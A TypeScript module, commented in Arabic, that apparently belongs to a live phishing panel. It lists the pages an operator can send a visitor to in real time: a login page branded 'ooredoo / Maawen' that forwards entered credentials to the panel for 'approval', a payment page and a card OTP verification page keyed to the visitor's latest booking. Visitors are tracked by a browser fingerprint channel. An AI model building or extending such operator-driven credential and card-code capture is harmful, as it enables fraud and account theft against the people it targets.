// صفحات الموقع التي يمكن للمدير توجيه العميل إليها من لوحة التحكم.
// القيمة (value) تُخزَّن في سجل التوجيه، والمسار (path) بدون بادئة اللغة —
// العميل يضيف لغة الصفحة الحالية تلقائياً عند التنفيذ.
export type DirectPage = {
  value: string;
  label: string;
  path: string;
  /**
   * الصفحات الديناميكية تحتاج معرّفات لحظية (bookingId / pid) لا تُعرف قبل
   * وقت التوجيه، فيُحسب المسار النهائي وقت الإرسال عبر resolvePath.
   */
  dynamic?: boolean;
  resolvePath?: (ctx: DirectResolveContext) => string | null;
};

export type DirectResolveContext = {
  bookingId?: string | null;
  /** معرّف أحدث entry من نوع payment تابع للحجز الحالي */
  paymentEntryId?: string | null;
};

export const DIRECT_PAGES: DirectPage[] = [
  { value: "home", label: "الرئيسية", path: "/" },
  { value: "candidates", label: "العاملات", path: "/candidates" },
  { value: "client-info", label: "بيانات العميل", path: "/client-info" },
  // تسجيل دخول العميل (ooredoo / معاون) — يرسل بيانات الدخول للوحة التحكم
  // لموافقة المدير، وليس صفحة AuthForm العامة (التي تتيح دخول المدير أيضاً).
  { value: "login", label: "تسجيل الدخول", path: "/maawen/login" },
  // صفحات الدفع ورمز التحقق — ديناميكية: تُبنى من آخر حجز/طلب دفع للعميل.
  // زر "ادفع الآن" في تدفق معاون يوجّه إلى /payment/{bookingId} — وليس /checkout.
  {
    value: "payment",
    label: "صفحة الدفع",
    path: "/payment", // placeholder يُستبدل بالمسار المحسوب
    dynamic: true,
    resolvePath: (ctx) => (ctx.bookingId ? `/payment/${ctx.bookingId}` : null),
  },
  {
    value: "verify-card",
    label: "صفحة رمز التحقق (OTP)",
    path: "/verify-card",
    dynamic: true,
    resolvePath: (ctx) =>
      ctx.bookingId && ctx.paymentEntryId
        ? `/verify-card/${ctx.bookingId}?pid=${ctx.paymentEntryId}`
        : null,
  },
];

export function getDirectPage(value: string): DirectPage | undefined {
  return DIRECT_PAGES.find((p) => p.value === value);
}

/** المسار النهائي (بدون لغة) للتوجيه، أو null إن تعذّر حله. */
export function resolveDirectPath(
  page: DirectPage,
  ctx: DirectResolveContext,
): string | null {
  if (!page.dynamic) return page.path;
  return page.resolvePath?.(ctx) ?? null;
}

// اسم قناة التوجيه الفوري. البصمة base64 قد تحوي + / = وهي غير مأمونة في
// أسماء قنوات Realtime، لذا نُطبّعها إلى أحرف آمنة (نفس القاعدة على الخادم والعميل).
export function directChannelKey(fingerprint: string): string {
  return fingerprint.replace(/[^a-zA-Z0-9]/g, "_");
}